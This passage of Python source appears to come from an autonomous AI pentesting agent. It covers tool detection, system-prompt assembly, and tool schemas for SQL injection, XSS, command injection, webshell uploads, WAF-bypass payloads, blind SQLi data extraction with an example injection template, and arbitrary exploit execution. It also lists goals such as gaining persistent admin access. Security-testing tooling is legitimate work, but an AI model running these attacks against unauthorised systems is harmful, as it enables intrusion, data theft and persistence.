            "Extract sensitive data available to admin role",
            "Achieve persistent access (create admin account if possible)",
        ],
    },
}


def _detect_available_tools() -> str:
    """Detect locally installed security tools via shutil.which().

    Inspired by PentestAgent's environment auto-detection pattern.
    Returns a formatted string listing available tools.
    """
    tools_to_check = {
        # Injection testing
        "sqlmap": "SQL injection testing",
        "dalfox": "XSS scanner",
        "commix": "Command injection",
        # Scanning
        "nuclei": "Template-based vuln scanner",
        "nmap": "Network scanner",
        "nikto": "Web server scanner",
        # Discovery
        "ffuf": "Web fuzzer",
        "gobuster": "Dir/file brute-forcer",
        "dirsearch": "Dir/file brute-forcer",
        "feroxbuster": "Recursive content discovery",
        # Proxy/interception
        "mitmproxy": "HTTP/HTTPS proxy",
        "mitmdump": "mitmproxy CLI mode",
        # Auth
        "jwt_tool": "JWT vulnerability testing",
        "hydra": "Brute-force login",
        # Recon
        "subfinder": "Subdomain discovery",
        "httpx": "HTTP probing",
        "wafw00f": "WAF detection",
        "whatweb": "Tech fingerprinting",
        "wappalyzer": "Tech fingerprinting",
        # Exploitation
        "metasploit": "Exploit framework",
        "msfconsole": "Metasploit console",
        # Utility
        "curl": "HTTP client",
        "jq": "JSON processor",
        "python3": "Python interpreter",
        "node": "Node.js runtime",
    }

    available = []
    for tool, desc in tools_to_check.items():
        if shutil.which(tool):
            available.append(f"{tool} ({desc})")

    if available:
        return ", ".join(available)
    return "(no external tools detected)"


# Cache environment detection (doesn't change during a session)
_cached_tools: str | None = None


def _get_available_tools() -> str:
    global _cached_tools
    if _cached_tools is None:
        _cached_tools = _detect_available_tools()
    return _cached_tools


def build_system_prompt(state: dict[str, Any]) -> str:
    """Render the system prompt with current state."""

    # Endpoints snapshot
    endpoints = state.get("endpoints", {})
    if endpoints:
        ep_lines = []
        for url, info in list(endpoints.items())[:50]:  # Cap at 50
            method = info.get("method", "GET")
            auth = "🔒" if info.get("auth_required") else "🔓"
            notes = info.get("notes", "")
            ep_lines.append(f"  {auth} {method} {url}" + (f" — {notes}" if notes else ""))
        endpoints_snapshot = "\n".join(ep_lines)
    else:
        endpoints_snapshot = "  (none discovered yet)"

    # Findings snapshot
    findings = state.get("findings", {})
    if findings:
        f_lines = []
        for fid, info in findings.items():
            sev = info.get("severity", "?")
            vtype = info.get("vuln_type", "?")
            ep = info.get("endpoint", "?")
            confirmed = "✓" if info.get("confirmed") else "?"
            f_lines.append(f"  [{sev}] {vtype} at {ep} ({confirmed})")
        findings_snapshot = "\n".join(f_lines)
    else:
        findings_snapshot = "  (none yet)"

    # Hypotheses summary
    hypotheses = state.get("hypotheses", {})
    if hypotheses:
        h_lines = []
        for hid, info in hypotheses.items():
            status = info.get("status", "pending")
            desc = info.get("description", "?")
            h_lines.append(f"  [{status}] {desc}")
        hypotheses_summary = "\n".join(h_lines)
    else:
        hypotheses_summary = "  (none yet — form hypotheses during recon!)"

    # Accounts summary
    accounts = state.get("accounts", {})
    if accounts:
        a_lines = []
        for username, info in accounts.items():
            role = info.get("role", "user")
            ctx = info.get("context_name", "default")
            a_lines.append(f"  {username} (role={role}, context={ctx})")
        accounts_summary = "\n".join(a_lines)
    else:
        accounts_summary = "  (none — consider registering test accounts)"

    # Traffic intelligence
    ti = state.get("traffic_intelligence", {})
    if ti:
        ti_lines = []
        if ti.get("waf_detected"):
            ti_lines.append(f"  WAF: {ti.get('waf_type', 'detected')}")
        if ti.get("id_params"):
            ti_lines.append(f"  ID params: {', '.join(ti['id_params'][:10])}")
        if ti.get("security_header_gaps"):
            ti_lines.append(f"  Missing headers: {', '.join(ti['security_header_gaps'][:5])}")
        if ti.get("cookie_issues"):
            ti_lines.append(f"  Cookie issues: {', '.join(str(c) for c in ti['cookie_issues'][:3])}")
        if ti.get("observations"):
            for obs in ti["observations"][:5]:
                ti_lines.append(f"  • {obs}")
        traffic_intelligence = "\n".join(ti_lines) if ti_lines else "  (analyze traffic after collecting some)"
    else:
        traffic_intelligence = "  (no traffic analyzed yet — use analyze_traffic after browsing)"

    # Compressed context
    compressed = state.get("compressed_summary", "")
    compressed_context = f"\n### Previous Context Summary\n{compressed}" if compressed else ""

    budget_spent = state.get("budget_spent", 0.0)
    budget_limit = state.get("budget_limit", 10.0)
    budget_pct = (budget_spent / budget_limit * 100) if budget_limit > 0 else 0

    max_turns = state.get("max_turns", 150)
    max_turns_display = " (indefinite)" if max_turns == 0 else f" / {max_turns}"

    # Knowledge graph insights
    try:
        from ai_brain.active.react_knowledge_graph import KnowledgeGraph
        kg = state.get("_knowledge_graph")
        if kg is None:
            kg = KnowledgeGraph()
        graph_insights = kg.generate_insights(state)
        if not graph_insights:
            graph_insights = "  (not enough data yet — keep exploring)"
    except Exception:
        graph_insights = "  (graph unavailable)"

    # Available local tools
    available_tools = _get_available_tools()

    # Dedup summary — show brain what's been tested and what failed
    dedup_lines = []
    tested = state.get("tested_techniques", {})
    failed = state.get("failed_approaches", {})
    no_progress = state.get("no_progress_count", 0)
    consec_fail = state.get("consecutive_failures", 0)
    confidence = state.get("confidence", 0.5)

    if tested:
        dedup_lines.append(f"  Techniques tested: {len(tested)}")
        # Show last 10 tested (most recent)
        recent_tested = list(tested.keys())[-10:]
        for key in recent_tested:
            dedup_lines.append(f"    - {key}")
    if failed:
        dedup_lines.append(f"  Failed approaches: {len(failed)}")
        for key, err in list(failed.items())[-5:]:
            dedup_lines.append(f"    - {key}: {err[:80]}")
    indefinite = max_turns == 0
    no_progress_limit = 25 if indefinite else 10
    consec_fail_limit = 15 if indefinite else 5
    if no_progress > 0:
        action = "resets strategy" if indefinite else "stops"
        dedup_lines.append(f"  No-progress turns: {no_progress}/{no_progress_limit} ({action} at {no_progress_limit})")
    if consec_fail > 0:
        action = "resets strategy" if indefinite else "stops"
        dedup_lines.append(f"  Consecutive failures: {consec_fail}/{consec_fail_limit} ({action} at {consec_fail_limit})")
    dedup_lines.append(f"  Confidence: {confidence:.2f} (0.0-1.0)")
    if confidence < 0.20:
        if indefinite:
            dedup_lines.append("  ⚠ LOW confidence — PIVOT: try completely different attack vectors, subdomains, or create accounts")
        else:
            dedup_lines.append("  ⚠ LOW confidence — consider finishing or pivoting strategy")
    elif confidence >= 0.80:
        if indefinite:
            dedup_lines.append("  ✓ HIGH confidence — good coverage on current surface. Now explore DEEPER: authenticated testing, JS analysis, less-common subdomains")
        else:
            dedup_lines.append("  ✓ HIGH confidence — validate findings and wrap up")

    dedup_summary = "\n".join(dedup_lines) if dedup_lines else "  (no tests executed yet)"

    # Session memory context (from prior sessions)
    memory_context = ""
    memory_path = state.get("memory_path", "")
    if memory_path:
        try:
            from ai_brain.active.react_memory import TargetMemory
            mem = TargetMemory(state.get("target_url", ""))
            saved = mem.load()
            if saved and saved.get("total_sessions", 0) > 0:
                memory_context = (
                    "### Session Memory\n"
                    + mem.get_memory_context(saved)
                )
        except Exception:
            pass

    # Vulnerability playbook (condensed) — inject when we have endpoints to test
    playbook_summary = ""
    if endpoints or hypotheses:
        try:
            from ai_brain.active.react_playbooks import CONDENSED_PLAYBOOK
            playbook_summary = CONDENSED_PLAYBOOK
        except Exception:
            pass

    # Working memory display (structured, never compressed)
    working_memory = state.get("working_memory", {})
    wm_lines = []
    for section_name, entries in working_memory.items():
        if entries:
            wm_lines.append(f"  **{section_name}**:")
            for key, value in entries.items():
                val_str = str(value)
                if len(val_str) > 200:
                    val_str = val_str[:200] + "..."
                wm_lines.append(f"    {key}: {val_str}")
    if wm_lines:
        working_memory_display = (
            "### Working Memory (Persistent — use update_working_memory to save important data)\n"
            + "\n".join(wm_lines)
        )
        # Cap at ~6K chars
        if len(working_memory_display) > 6000:
            working_memory_display = working_memory_display[:6000] + "\n  ... [truncated]"
    else:
        working_memory_display = ""

    # Phase budget display
    phase = _detect_phase(state)
    phase_budgets = state.get("phase_budgets", {})
    phase_info = phase_budgets.get(phase, {})
    phase_allocated = phase_info.get("allocated_pct", 0) * budget_limit
    phase_spent_val = phase_info.get("spent", 0.0)
    phase_remaining = max(0, phase_allocated - phase_spent_val)
    phase_pct_used = (phase_spent_val / phase_allocated * 100) if phase_allocated > 0 else 0

    # Info gain trend
    info_gains = state.get("info_gain_history", [])
    recent_gains = [g.get("total_gain", 0) for g in info_gains[-3:]]
    if not recent_gains:
        gain_trend = "no data"
    elif all(g == 0 for g in recent_gains) and len(recent_gains) >= 2:
        gain_trend = "STALLING — consider pivoting strategy"
    elif len(recent_gains) >= 2 and recent_gains[-1] < recent_gains[-2]:
        gain_trend = "declining"
    else:
        gain_trend = "positive"

    budget_warnings = ""
    if phase_pct_used > 80:
        budget_warnings = f"  WARNING: Phase '{phase}' budget is {phase_pct_used:.0f}% used. Consider moving to next phase."

    phase_budget_display = (
        f"### Phase & Budget\n"
        f"  Current phase: {phase} | Phase budget: ${phase_remaining:.2f} remaining ({phase_pct_used:.0f}% used)\n"
        f"  Information gain trend: {gain_trend} (last 3 turns: {recent_gains})\n"
        f"{budget_warnings}"
    ).rstrip()

    # Situational hints (context-aware guidance)
    situational_hints = _generate_situational_hints(state)

    # Attack chains display (structured multi-step tracking)
    chains = state.get("attack_chains", {})
    if chains:
        chain_lines = ["### Active Attack Chains"]
        chain_lines.append("**PRIORITY: Advance active chains before starting new tests.**")
        for cid, chain in chains.items():
            goal = chain.get("goal", "?")
            steps = chain.get("steps", [])
            current = chain.get("current_step", 0)
            conf = chain.get("confidence", 0.5)
            chain_lines.append(f"\n  Chain [{cid}] (confidence={conf:.0%}): {goal}")
            for i, step in enumerate(steps):
                status = step.get("status", "pending")
                icons = {"completed": "[DONE]", "in_progress": "[>>>]", "failed": "[FAIL]"}
                icon = icons.get(status, "[    ]")
                marker = " <-- CURRENT STEP" if i == current and status != "completed" else ""
                chain_lines.append(f"    {icon} Step {i+1}: {step['description']}{marker}")
                if step.get("output"):
                    chain_lines.append(f"           Result: {str(step['output'])[:200]}")
        chain_lines.append("\nUse `manage_chain` to advance/update chains. Use `manage_chain(create)` when you discover multi-step opportunities.")
        attack_chains_display = "\n".join(chain_lines)
    else:
        attack_chains_display = ""

    return SYSTEM_PROMPT_TEMPLATE.format(
        target_url=state.get("target_url", "?"),
        tech_stack=", ".join(state.get("tech_stack", [])) or "(unknown)",
        phase=state.get("phase", "running"),
        budget_spent=budget_spent,
        budget_limit=budget_limit,
        budget_pct=budget_pct,
        turn_count=state.get("turn_count", 0),
        max_turns_display=max_turns_display,
        endpoint_count=len(endpoints),
        endpoints_snapshot=endpoints_snapshot,
        findings_count=len(findings),
        findings_snapshot=findings_snapshot,
        hypotheses_summary=hypotheses_summary,
        accounts_summary=accounts_summary,
        traffic_intelligence=traffic_intelligence,
        graph_insights=graph_insights,
        available_tools=available_tools,
        dedup_summary=dedup_summary,
        memory_context=memory_context,
        working_memory_display=working_memory_display,
        phase_budget_display=phase_budget_display,
        playbook_summary=playbook_summary,
        compressed_context=compressed_context,
        situational_hints=situational_hints,
        attack_chains_display=attack_chains_display,
    )


# ── Tool Schemas ─────────────────────────────────────────────────────────

# Each schema follows Anthropic's tool-use format.
# Grouped: Recon (9) + Attack (22) + Utility (10) = 41 tools (phase-filtered at runtime)

_RECON_TOOLS: list[dict[str, Any]] = [
    {
        "name": "navigate_and_extract",
        "description": (
            "Navigate the browser to a URL and extract page information including "
            "forms, links, scripts, headers, and visible text. Use this for initial "
            "recon and understanding page structure. Returns page title, URL, forms "
            "(with fields and actions), links, script sources, and meta tags."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to",
                },
                "context_name": {
                    "type": "string",
                    "description": "Browser context to use (default: 'default'). Use different contexts for different user sessions.",
                    "default": "default",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "crawl_target",
        "description": (
            "Crawl the target website starting from a URL, following links up to "
            "a specified depth. Discovers pages, forms, API endpoints, and tech stack. "
            "Use this early in recon to map the full attack surface."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "start_url": {
                    "type": "string",
                    "description": "URL to start crawling from",
                },
                "max_pages": {
                    "type": "integer",
                    "description": "Maximum number of pages to visit (default: 30)",
                    "default": 30,
                },
                "context_name": {
                    "type": "string",
                    "description": "Browser context to use",
                    "default": "default",
                },
            },
            "required": ["start_url"],
        },
    },
    {
        "name": "run_nuclei_scan",
        "description": (
            "Run Nuclei vulnerability scanner against a target URL. Nuclei uses "
            "template-based scanning for known CVEs, misconfigurations, and common "
            "vulnerabilities. Good for finding low-hanging fruit quickly."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to scan",
                },
                "severity": {
                    "type": "string",
                    "description": "Severity filter (e.g., 'critical,high,medium')",
                    "default": "critical,high,medium",
                },
            },
            "required": ["target"],
        },
    },
    {
        "name": "run_content_discovery",
        "description": (
            "Discover hidden files, directories, and endpoints using brute-force "
            "wordlists. Finds admin panels, backup files, config files, API endpoints "
            "that aren't linked in the UI."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Base URL to enumerate (e.g., https://target.com/)",
                },
                "tool": {
                    "type": "string",
                    "enum": ["ffuf", "gobuster"],
                    "description": "Tool to use for discovery",
                    "default": "ffuf",
                },
                "mode": {
                    "type": "string",
                    "description": "Discovery mode (e.g., 'directory', 'vhost')",
                    "default": "directory",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "detect_technologies",
        "description": (
            "Detect the technology stack of the target: web server, framework, CMS, "
            "JavaScript libraries, CDN, WAF, etc. Helps choose targeted attack vectors. "
            "E.g., Laravel → test for debug mode, mass assignment; WordPress → test for "
            "plugin vulns."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to analyze",
                },
            },
            "required": ["target"],
        },
    },
    {
        "name": "detect_waf",
        "description": (
            "Detect Web Application Firewall (WAF) presence and identify the vendor. "
            "Knowing the WAF helps craft evasion payloads. Returns WAF name and "
            "confidence level."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to probe for WAF",
                },
            },
            "required": ["target"],
        },
    },
    {
        "name": "analyze_traffic",
        "description": (
            "Analyze all captured proxy traffic for security insights. This is FREE "
            "(no API cost) — pure Python analysis of HTTP request/response data. "
            "Identifies: missing security headers, sequential ID parameters, price/role "
            "parameters, cookie security issues, CSRF weaknesses, WAF fingerprints, "
            "timing anomalies, and error patterns. Run after browsing the site to get "
            "intelligence for targeted testing."
        ),
        "input_schema": {
            "type": "object",
            "properties": {},
        },
    },
    {
        "name": "enumerate_subdomains",
        "description": (
            "Discover subdomains using passive sources (certificate transparency, "
            "subfinder). Returns discovered subdomains without port scanning. Use during "
            "early recon to expand the attack surface within allowed domains."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {
                    "type": "string",
                    "description": "Root domain to enumerate (e.g., example.com)",
                },
            },
            "required": ["domain"],
        },
    },
    {
        "name": "resolve_domains",
        "description": (
            "Resolve a list of subdomains to IP addresses using DNS. No port "
            "scanning — only DNS A record lookup. Useful after enumerate_subdomains to "
            "find which subdomains are live."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "subdomains": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "List of subdomains to resolve (max 100)",
                },
            },
            "required": ["subdomains"],
        },
    },
]

_ATTACK_TOOLS: list[dict[str, Any]] = [
    {
        "name": "test_sqli",
        "description": (
            "Test a URL/parameter for SQL injection using sqlmap. Supports various "
            "techniques (Boolean, Error, Union, Stacked, Time-based). Pass specific "
            "parameters to test, or let sqlmap auto-detect from the URL query string."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL (can include query params like ?id=1)",
                },
                "params": {
                    "type": "object",
                    "description": "Specific parameters to test (e.g., {\"id\": \"1\"}). If empty, tests URL query params.",
                    "additionalProperties": {"type": "string"},
                },
                "options": {
                    "type": "object",
                    "description": "Extra sqlmap options (e.g., {\"level\": 3, \"risk\": 2, \"technique\": \"BEU\"})",
                    "additionalProperties": {},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_xss",
        "description": (
            "Test a URL/parameter for Cross-Site Scripting (XSS) using dalfox. "
            "Supports reflected XSS, stored XSS detection, and DOM-based XSS. "
            "Returns specific payloads that triggered XSS."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL with parameters to test (e.g., https://target.com/search?q=test)",
                },
                "params": {
                    "type": "object",
                    "description": "Specific parameters to test",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_cmdi",
        "description": (
            "Test a URL/parameter for command injection using commix. Detects OS "
            "command injection in various contexts (classic, eval-based, time-based)."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL with injectable parameter",
                },
                "params": {
                    "type": "object",
                    "description": "Parameters to test",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_auth_bypass",
        "description": (
            "Test for authentication bypass vulnerabilities: HTTP verb tampering, "
            "path traversal to bypass auth, header manipulation (X-Original-URL, "
            "X-Forwarded-For, X-Real-IP), forced browsing to authenticated endpoints. "
            "Sends crafted HTTP requests and compares responses. When body or method=POST "
            "is provided, bypass headers are tested with both GET and POST."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Authenticated endpoint URL to bypass",
                },
                "methods": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "HTTP methods to try (default: all common methods)",
                },
                "headers": {
                    "type": "object",
                    "description": "Extra headers for the request",
                    "additionalProperties": {"type": "string"},
                },
                "body": {
                    "type": "object",
                    "description": "POST body/form data to send with bypass attempts (e.g., {username: 'admin', password: 'admin'})",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "description": "Request method. If POST, bypass headers are tested with both GET and POST.",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_idor",
        "description": (
            "Test an endpoint for Insecure Direct Object Reference (IDOR) by replaying "
            "requests across different privilege levels. Requires at least 2 test "
            "accounts. Compares responses when User A accesses User B's resources."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Endpoint URL with object reference (e.g., /api/users/123)",
                },
                "method": {
                    "type": "string",
                    "description": "HTTP method (GET, POST, PUT, DELETE)",
                    "default": "GET",
                },
                "id_param": {
                    "type": "string",
                    "description": "Parameter name containing the object ID",
                },
                "test_values": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Object ID values to test (other users' IDs)",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_file_upload",
        "description": (
            "Test a file upload field with malicious payloads: PHP/ASP/JSP webshells, "
            "polyglot files, SVG XSS, .htaccess/web.config overwrite, path traversal "
            "filenames, and SSI injection. Payloads are ranked by relevance to the "
            "detected tech stack."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "URL of the page with the file upload form",
                },
                "selector": {
                    "type": "string",
                    "description": "CSS selector for the file input element (e.g., 'input[type=file]')",
                    "default": "input[type=file]",
                },
                "max_payloads": {
                    "type": "integer",
                    "description": "Maximum number of payloads to test (default: 10)",
                    "default": 10,
                },
                "context_name": {
                    "type": "string",
                    "description": "Browser context to use",
                    "default": "default",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "send_http_request",
        "description": (
            "Send an arbitrary HTTP request — the Burp Repeater equivalent. Use this "
            "for manual testing, header manipulation, parameter tampering, or replaying "
            "modified requests. Returns full response with status, headers, body, and "
            "timing. Supports all HTTP methods and custom headers/body."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL",
                },
                "method": {
                    "type": "string",
                    "description": "HTTP method",
                    "default": "GET",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom request headers",
                    "additionalProperties": {"type": "string"},
                },
                "body": {
                    "type": "string",
                    "description": "Request body (for POST/PUT/PATCH)",
                },
                "cookies": {
                    "type": "object",
                    "description": "Cookies to include",
                    "additionalProperties": {"type": "string"},
                },
                "follow_redirects": {
                    "type": "boolean",
                    "description": "Whether to follow redirects (default: false)",
                    "default": False,
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_jwt",
        "description": (
            "Test a JWT token for vulnerabilities: none algorithm, key confusion, "
            "brute-force weak secret, expired token acceptance, algorithm switching. "
            "Pass the JWT token string."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "The JWT token to test",
                },
                "attacks": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Specific attacks to run (default: all)",
                },
            },
            "required": ["token"],
        },
    },
    {
        "name": "run_custom_exploit",
        "description": (
            "LAST RESORT: Execute custom Python code in a sandboxed environment. "
            "ONLY use this when built-in tools have already failed or cannot handle "
            "the specific test. Valid uses: (1) verifying a finding already discovered "
            "by another tool, (2) multi-step chained exploits that require atomic execution, "
            "(3) race conditions needing concurrent requests, (4) complex protocol-level "
            "attacks. NEVER use this for basic HTTP requests, fuzzing, SQLi testing, or "
            "anything that send_http_request/systematic_fuzz/test_sqli can already do."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "code": {
                    "type": "string",
                    "description": "Python code to execute. Must print results to stdout.",
                },
                "description": {
                    "type": "string",
                    "description": "Brief description of what this exploit tests",
                },
                "timeout": {
                    "type": "integer",
                    "description": "Execution timeout in seconds (default: 60)",
                    "default": 60,
                },
            },
            "required": ["code", "description"],
        },
    },
    {
        "name": "blind_sqli_extract",
        "description": (
            "Extract data from blind SQL injection using binary search. "
            "Zero LLM cost — runs ~7 HTTP requests per character deterministically. "
            "First verify the injection point manually with send_http_request, then use this "
            "tool with the confirmed true/false condition."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "method": {"type": "string", "enum": ["GET", "POST"], "description": "HTTP method"},
                "param": {"type": "string", "description": "Vulnerable parameter name"},
                "injection_template": {
                    "type": "string",
                    "description": (
                        "SQL template with {query}, {pos}, {mid} placeholders. "
                        "Example: \"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -\""
                    ),
                },
                "true_condition": {
                    "type": "object",
                    "description": (
                        "How to detect TRUE: {type: 'status_code'|'content_contains'"
                        "|'content_length'|'time_delay', value: ...}"
                    ),
                },
                "db_type": {"type": "string", "enum": ["mysql", "postgres", "mssql", "sqlite"]},
                "target_query": {
                    "type": "string",
                    "description": "SQL query to extract (e.g. 'SELECT password FROM users LIMIT 1')",
                },
                "max_chars": {"type": "integer", "description": "Max characters to extract (default 64)"},
            },
            "required": ["url", "method", "param", "injection_template", "true_condition", "db_type", "target_query"],
        },
    },
    {
        "name": "response_diff_analyze",
        "description": (
            "Compare HTTP responses systematically to detect blind injection points, "
            "WAF behavior, and filter rules. Sends a baseline request multiple times to establish "
            "normal variance, then compares test requests. Classifies each as WAF_BLOCKED, "
            "SANITIZED, APP_ERROR, PASSED, or INCONCLUSIVE."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "base_request": {
                    "type": "object",
                    "description": "{url, method, headers, body, params} — the baseline request",
                },
                "test_requests": {
                    "type": "array",
                    "items": {"type": "object"},
                    "description": "List of {label, ...overrides} to compare against baseline",
                },
                "baseline_samples": {"type": "integer", "description": "Baseline repetitions (default 3)"},
            },
            "required": ["base_request", "test_requests"],
        },
    },
    {
        "name": "systematic_fuzz",
        "description": (
            "Run wordlist-based fuzzing without LLM cost. Use {FUZZ} placeholder in URL "
            "or body. Built-in wordlists: common-dirs, common-files, sqli-payloads, xss-payloads, "
            "lfi-payloads, jwt-secrets, default-credentials, ssti-payloads, ssrf-payloads, "
            "cmdi-payloads, flag-files, sqli-filter-bypass, s3-buckets. Or provide a custom list."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url_template": {"type": "string", "description": "URL with {FUZZ} placeholder"},
                "wordlist": {"description": "Built-in wordlist name (string) or custom word list (array of strings)"},
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST", "PUT", "DELETE"],
                    "description": "HTTP method (default GET)",
                },
                "headers": {"type": "object", "description": "Custom headers"},
                "body_template": {"type": "string", "description": "Body with {FUZZ} placeholder"},
                "match_status": {
                    "type": "array",
                    "items": {"type": "integer"},
                    "description": "Status codes to include",
                },
                "filter_status": {
                    "type": "array",
                    "items": {"type": "integer"},
                    "description": "Status codes to exclude",
                },
                "match_contains": {"type": "string", "description": "Include if response contains this string"},
                "filter_contains": {"type": "string", "description": "Exclude if response contains this string"},
                "max_requests": {"type": "integer", "description": "Max requests (default 500)"},
                "rate_limit": {"type": "number", "description": "Seconds between requests (default 0.05)"},
            },
            "required": ["url_template", "wordlist"],
        },
    },
    {
        "name": "waf_fingerprint",
        "description": (
            "Fingerprint the target's WAF by probing with 70+ keywords and testing "
            "encoding bypasses. Zero LLM cost. Returns a WAF profile with blocked/allowed "
            "keywords and working bypass encodings. Run this BEFORE testing if you suspect "
            "a WAF is blocking your payloads."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL to fingerprint",
                },
                "test_param": {
                    "type": "string",
                    "description": "Parameter name to inject probes into (default: 'q')",
                    "default": "q",
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "waf_generate_bypasses",
        "description": (
            "Generate bypass payloads for a specific attack type based on WAF fingerprint. "
            "Must run waf_fingerprint first. Returns payloads ranked by bypass confidence. "
            "Zero LLM cost."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "attack_type": {
                    "type": "string",
                    "enum": ["xss", "sqli", "cmdi", "path_traversal"],
                    "description": "Type of attack to generate bypasses for",
                },
                "domain": {
                    "type": "string",
                    "description": "Domain to get WAF profile for (must have been fingerprinted)",
                },
            },
            "required": ["attack_type", "domain"],
        },
    },
    {
        "name": "test_http_smuggling",
        "description": (
            "Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE). Uses raw sockets "
            "to send ambiguous Content-Length/Transfer-Encoding requests. Critical severity "
            "if found — enables request hijacking, cache poisoning, auth bypass."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL to test for smuggling",
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_cache_poisoning",
        "description": (
            "Test for web cache poisoning via unkeyed headers (X-Forwarded-Host, "
            "X-Original-URL, etc.). Sends poisoned request, then verifies if the "
            "poison persists in cached response."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL to test for cache poisoning",
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_ghost_params",
        "description": (
            "Discover hidden parameters that enable mass assignment or privilege "
            "escalation. Tests 40+ privilege-related parameters (admin, role, verified, "
            "debug, etc.) against an endpoint. Zero LLM cost."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Endpoint URL to test (typically a registration or profile update endpoint)",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST", "PUT", "PATCH"],
                    "description": "HTTP method (default: POST)",
                    "default": "POST",
                },
                "original_body": {
                    "type": "object",
                    "description": "Original form data/body to augment with ghost params",
                    "additionalProperties": {"type": "string"},
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_prototype_pollution",
        "description": (
            "Test JSON API endpoints for server-side prototype pollution (__proto__, "
            "constructor.prototype). Effective against Node.js/Express backends. "
            "Sends pollution payloads and checks if application state changes."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "JSON API endpoint URL to test",
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_open_redirect",
        "description": (
            "Systematically test for open redirect vulnerabilities. Tests 25 redirect "
            "parameter names with 12 bypass payloads. Checks both HTTP redirect (3xx) "
            "and client-side redirect (meta refresh, JS). Zero LLM cost."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL to test for open redirects",
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "profile_endpoint_behavior",
        "description": (
            "Build a behavioral baseline for an endpoint (timing, response size, headers, "
            "cookies) then detect anomalies by varying parameter values. Finds bugs that "
            "don't match known patterns. Also supports type confusion testing. Zero LLM cost."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Endpoint URL to profile",
                },
                "param": {
                    "type": "string",
                    "description": "Parameter to test for anomalies",
                },
                "test_values": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Values to test (if empty, uses type confusion values)",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "description": "HTTP method (default: GET)",
                    "default": "GET",
                },
                "cookies": {
                    "type": "object",
                    "description": "Authentication cookies",
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["url", "param"],
        },
    },
    {
        "name": "discover_chains",
        "description": (
